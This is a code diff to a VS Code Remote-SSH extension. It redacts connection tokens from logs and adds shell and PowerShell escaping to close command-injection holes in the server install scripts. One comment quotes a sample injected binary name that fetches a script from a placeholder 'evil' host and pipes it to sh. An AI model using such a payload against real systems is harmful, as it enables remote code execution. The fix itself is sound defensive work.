@@ -2,7 +2,7 @@ import * as crypto from 'crypto';
 import * as fs from 'fs';
 import * as path from 'path';
 import Log from './common/logger';
-import { escapeShellArg } from './common/shellQuote';
+import { escapePowerShellArg, escapeShellArg } from './common/shellQuote';
 import { getVSCodeServerConfig, ServerVersion, ServerValidation } from './serverConfig';
 import SSHConnection from './ssh/sshConnection';
 import { fetchRelease, IRelease } from './fetchRelease';
@@ -185,7 +185,7 @@ export async function installCodeServer(
     if (platform === 'windows') {
         const installServerScript = generatePowerShellInstallScript(installOptions, extensionPath);
 
-        logger.trace('Server install command:', installServerScript);
+        logger.trace('Server install command:', redactConnectionToken(installServerScript));
 
         const installDir = `$HOME\\${vscodeServerConfig.serverDataFolderName}\\install`;
         const installScript = `${installDir}\\${vscodeServerConfig.commit}.ps1`;
@@ -232,17 +232,19 @@ export async function installCodeServer(
     } else {
         const installServerScript = generateBashInstallScript(installOptions, extensionPath);
 
-        logger.trace('Server install command:', installServerScript);
+        logger.trace('Server install command:', redactConnectionToken(installServerScript));
         // Use base64 encoding to avoid shell quoting issues across different login shells (bash, csh, tcsh, fish).
         // csh cannot handle multi-line strings inside single quotes with -c, so piping via base64 is the most portable approach.
         const base64Script = Buffer.from(installServerScript).toString('base64');
         commandOutput = await conn.exec(`echo ${base64Script} | base64 -d | bash -l`);
     }
 
+    // Redacted too: the script echoes `connectionToken==<uuid>==` on stdout,
+    // and stderr can carry the same script text back on a shell error.
     if (commandOutput.stderr) {
-        logger.trace('Server install command stderr:', commandOutput.stderr);
+        logger.trace('Server install command stderr:', redactConnectionToken(commandOutput.stderr));
     }
-    logger.trace('Server install command stdout:', commandOutput.stdout);
+    logger.trace('Server install command stdout:', redactConnectionToken(commandOutput.stdout));
 
     const resultMap = parseServerInstallOutput(commandOutput.stdout, scriptId);
     if (!resultMap) {
@@ -335,8 +337,50 @@ export function escapeCustomInstallPath(customInstallPath: string): string {
     return rest ? `$HOME${escapeShellArg(rest)}` : '$HOME';
 }
 
+// The PowerShell mirror of `escapeCustomInstallPath`. server-setup.ps1 has no
+// `$HOME`, so the `~` shorthand the bash side expands via `$HOME` becomes a
+// `Resolve-Path ~` subexpression — emitted by us, *outside* the escaped
+// literal, so a user-supplied `$(…)` can never reach an evaluated context.
+export function escapePowerShellInstallPath(customInstallPath: string): string {
+    const homeShorthand = customInstallPath.match(/^~(?=[\\/]|$)/);
+    if (!homeShorthand) {
+        return escapePowerShellArg(customInstallPath);
+    }
+
+    const rest = customInstallPath.slice(1);
+    // `+` is PowerShell string concatenation; the assignment's right-hand side
+    // is parsed in expression mode, so this evaluates before the assignment.
+    return rest ? `"$(Resolve-Path ~)" + ${escapePowerShellArg(rest)}` : '"$(Resolve-Path ~)"';
+}
+
+// The connection token authenticates every client of the freshly started
+// remote server. `Log.trace` is *not* level-gated (src/common/logger.ts) — it
+// always appends to the "Remote - SSH" output channel — and both the compiled
+// install script (`SERVER_CONNECTION_TOKEN="<uuid>"`) and its stdout
+// (`connectionToken==<uuid>==`) carry it, so a user pasting that channel into a
+// bug report published the token. Redact the value, keep the surrounding
+// diagnostics (CLAUDE.md: "no logging of secrets").
+const CONNECTION_TOKEN_REDACTIONS: ReadonlyArray<readonly [RegExp, string]> = [
+    // bash: SERVER_CONNECTION_TOKEN="<uuid>"
+    [/(SERVER_CONNECTION_TOKEN\s*=\s*")[^"\r\n]+(")/g, '$1<redacted>$2'],
+    // PowerShell: $SERVER_CONNECTION_TOKEN='<uuid>'
+    [/(SERVER_CONNECTION_TOKEN\s*=\s*')[^'\r\n]+(')/g, '$1<redacted>$2'],
+    // Result line on stdout. `+` (not `*`) so the legitimate empty
+    // `connectionToken====` is left alone instead of being made to look like a
+    // token was present.
+    [/(connectionToken==)[^=\r\n]+(==)/g, '$1<redacted>$2'],
+];
+
+export function redactConnectionToken(text: string): string {
+    return CONNECTION_TOKEN_REDACTIONS.reduce((acc, [pattern, replacement]) => acc.replace(pattern, replacement), text);
+}
+
 export function generateBashInstallScript({ id, quality, version, commit, release, extensionIds, envVariables, useSocketPath, serverApplicationName, serverDataFolderName, serverDownloadUrlTemplate, customInstallPath, serverValidation }: ServerInstallOptions, extensionPath: string): string {
-    const extensions = extensionIds.map(extId => '--install-extension ' + extId).join(' ');
+    // Each id is quoted individually: the value fills a bash *array* literal in
+    // server-setup.sh, so one element per id keeps `--install-extension a b`
+    // from ever collapsing, and `remote.SSH.defaultExtensions: ["$(id)"]` stays
+    // inert data instead of being evaluated inside a double-quoted assignment.
+    const extensions = extensionIds.map(extId => '--install-extension ' + escapeShellArg(extId)).join(' ');
     const serverDataDir = customInstallPath
         ? escapeCustomInstallPath(customInstallPath)
         : `$HOME/${serverDataFolderName}`;
@@ -350,7 +394,11 @@ export function generateBashInstallScript({ id, quality, version, commit, releas
         DISTRO_COMMIT: commit,
         DISTRO_QUALITY: quality,
         DISTRO_VSCODIUM_RELEASE: release ?? '',
-        SERVER_APP_NAME: serverApplicationName,
+        // Single-quoted at template time (`remote.SSH.serverBinaryName` is
+        // user-configurable and server-setup.sh's assignment is now unquoted)
+        // — inside `"…"` bash evaluates `$( )`/backticks, so a binary name of
+        // `code-server$(curl -s http://evil/x|sh)` was remote code execution.
+        SERVER_APP_NAME: escapeShellArg(serverApplicationName),
         SERVER_INITIAL_EXTENSIONS: extensions,
         SERVER_LISTEN_FLAG: listenFlag,
         SERVER_DATA_DIR: serverDataDir,
@@ -369,8 +417,14 @@ export function generateBashInstallScript({ id, quality, version, commit, releas
     }, extensionPath);
 }
 
-function generatePowerShellInstallScript({ id, quality, version, commit, release, extensionIds, envVariables, useSocketPath, serverApplicationName, serverDataFolderName, serverDownloadUrlTemplate, customInstallPath, serverValidation }: ServerInstallOptions, extensionPath: string): string {
-    const extensions = extensionIds.map(extId => '--install-extension ' + extId).join(' ');
+export function generatePowerShellInstallScript({ id, quality, version, commit, release, extensionIds, envVariables, useSocketPath, serverApplicationName, serverDataFolderName, serverDownloadUrlTemplate, customInstallPath, serverValidation }: ServerInstallOptions, extensionPath: string): string {
+    // Escaped twice on purpose: the inner quoting is what the nested
+    // `powershell -c "& <script> $SCRIPT_ARGUMENTS"` re-parse sees (one token
+    // per id), the outer quoting makes the whole thing an inert literal in the
+    // `$SERVER_INITIAL_EXTENSIONS=` assignment.
+    const extensions = escapePowerShellArg(
+        extensionIds.map(extId => '--install-extension ' + escapePowerShellArg(extId)).join(' ')
+    );
     const downloadUrl = serverDownloadUrlTemplate
         .replace(/\$\{quality\}/g, quality)
         .replace(/\$\{version\}/g, version)
@@ -379,28 +433,39 @@ function generatePowerShellInstallScript({ id, quality, version, commit, release
         .replace(/\$\{arch\}/g, 'x64')
         .replace(/\$\{release\}/g, release ?? '');
     const serverDataDir = customInstallPath
-        ? customInstallPath.replace(/^~(?=[\\/]|$)/, '$(Resolve-Path ~)')
-        : `$(Resolve-Path ~)\\${serverDataFolderName}`;
+        ? escapePowerShellInstallPath(customInstallPath)
+        : `"$(Resolve-Path ~)" + ${escapePowerShellArg(`\\${serverDataFolderName}`)}`;
     const listenFlag = useSocketPath
         ? `--socket-path="$TMP_DIR/vscode-server-sock-${crypto.randomUUID()}"`
         : '--port=0';
     const envVarLines = envVariables.map(envVar => `    "$${envVar}==$${envVar}=="`).join('\n');
 
+    // Every value below that can carry user input is single-quoted for
+    // PowerShell, and the matching slots in server-setup.ps1 are bare (no
+    // surrounding `"…"`). In a double-quoted PowerShell string `$(…)` is
+    // *evaluated* and `"` terminates the string, so the previous verbatim
+    // splicing made `remote.SSH.serverInstallPath` /
+    // `serverDownloadUrlTemplate` / `serverBinaryName` remote-code-execution
+    // vectors — the Windows twin of the bash hazard `escapeShellArg` closed.
     return compileTemplate('server-setup.ps1', {
-        DISTRO_VERSION: version,
-        DISTRO_COMMIT: commit,
-        DISTRO_QUALITY: quality,
-        DISTRO_VSCODIUM_RELEASE: release ?? '',
-        SERVER_APP_NAME: serverApplicationName,
+        DISTRO_VERSION: escapePowerShellArg(version),
+        DISTRO_COMMIT: escapePowerShellArg(commit),
+        DISTRO_QUALITY: escapePowerShellArg(quality),
+        DISTRO_VSCODIUM_RELEASE: escapePowerShellArg(release ?? ''),
+        SERVER_APP_NAME: escapePowerShellArg(serverApplicationName),
         SERVER_INITIAL_EXTENSIONS: extensions,
         SERVER_LISTEN_FLAG: listenFlag,
         SERVER_DATA_DIR: serverDataDir,
-        SERVER_DATA_DIR_FLAG: customInstallPath ? '--server-data-dir=""$SERVER_DATA_DIR""' : '',
+        // `psQuote` (defined in the template) quotes $SERVER_DATA_DIR at
+        // runtime, for the nested `powershell -c` parse — the old
+        // `--server-data-dir=""$SERVER_DATA_DIR""` left a `$` in the path
+        // expandable there.
+        SERVER_DATA_DIR_FLAG: customInstallPath ? '--server-data-dir=$(psQuote $SERVER_DATA_DIR)' : '',
         SERVER_VALIDATION_FLAG: serverValidation === 'skip' ? '--disable-client-validation' : '',
-        SERVER_DOWNLOAD_URL: downloadUrl,
+        SERVER_DOWNLOAD_URL: escapePowerShellArg(downloadUrl),
         SCRIPT_ID: id,
         ENV_VAR_LINES: envVarLines,
         MODIFY_PRODUCT_JSON: serverValidation === 'force' ? '$true' : '$false',
-        SERVER_CONNECTION_TOKEN: crypto.randomUUID(),
+        SERVER_CONNECTION_TOKEN: escapePowerShellArg(crypto.randomUUID()),
     }, extensionPath);
 }
